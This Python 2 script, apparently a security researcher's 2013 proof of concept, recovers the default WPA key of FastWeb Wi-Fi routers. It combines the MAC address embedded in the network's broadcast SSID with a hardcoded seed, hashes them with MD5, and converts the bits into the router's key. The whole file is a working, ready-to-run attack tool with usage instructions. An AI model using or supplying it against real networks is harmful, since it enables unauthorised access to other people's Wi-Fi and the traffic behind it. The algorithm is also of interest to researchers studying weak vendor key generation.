#!/usr/bin/env python
# -*- coding: utf-8 -*-

# www.ednolo.alumnos.upv.es

'''

Original link:    
Coded by : Eduardo Novella 
@enovella_   http://www.ednolo.alumnos.upv.es

Changelog:
---------------
2013/07/10 v0.1.1  + Added stdout parameter for making module.
2013/07/03 v0.1.0  + First commit
 
'''

import re
import sys
import hashlib

VERSION     = 0
SUBVERSION  = 1
RELEASE     = 1
DATEVERSION = '2013/07/10' 
URL         = 'http://www.ednolo.alumnos.upv.es'

def gen_key(mac,stdout='True'):
    
    seed = ("\x22\x33\x11\x34\x02\x81\xFA\x22\x11\x41\x68\x11\x12\x01\x05\x22\x71\x42\x10\x66")
    
    h = hashlib.md5()
    h.update(mac)
    h.update(seed)
    hmd5   = h.hexdigest()
    
    # Firt 4 bytes of hash (h[:8]) to binary
    bin_str = bin(int(hmd5[:8],16))[2:].zfill(32)
    
    if (stdout):
        print "[+] MD5    : %s" % hmd5
        print "[+] Extract: %s " %hmd5[:8]   
        print "[+] Binary : %s" % bin_str
    
    # Groups of 5 digits, we don't appreciate last 2 bits
    wpa = ''
    for b in xrange(0,25,5):
        n=int(bin_str[b:b+5],2)
        if (n > 0x0a): n += 0x57
        wpa += hex(n)[2:].zfill(2)
        
    return wpa

def banner():
    print ' --------------------------------------------------------------------'
    print '|                       FastWeb Routers Wi-Fi                        |'
    print '|--------------------------------------------------------------------|'
    print '|                 Default WPA Key Algorithm Weakness                 |'
    print '|               Eduardo Novella <@enovella_>                         |'
    print ' --------------------------------------------------------------------' 
    print '%s %d.%d.%d    %s     [%s]\n\n' %(sys.argv[0], VERSION, SUBVERSION,RELEASE,DATEVERSION,URL)    

def usage():
    print '\t usage: python %s [ESSID]\n' %sys.argv[0]
    print '\t eg. python %s  FASTWEB-1-00193EA1B2C3'  %sys.argv[0]     
    sys.exit()    

def main():

    banner()   
    if len(sys.argv) != 2:
        usage()

    try:
        mac  = re.split("-", sys.argv[1])[2]
    except:
        usage()
        
    mac_str   = re.sub(r'[^a-fA-F0-9]', '',mac)
       
    if len(mac_str) != 12:
        sys.exit('[!] Check MAC format!\n')
       
    mac = bytearray.fromhex(mac_str)
    
      
    print '[+] SSID   : FASTWEB-1-%12s' % (mac_str)
    print '[+] MAC    : %s ' % (mac_str)
    print '[+] WPA key: %s'  % (gen_key(mac))
   

if __name__ == "__main__":
    main()

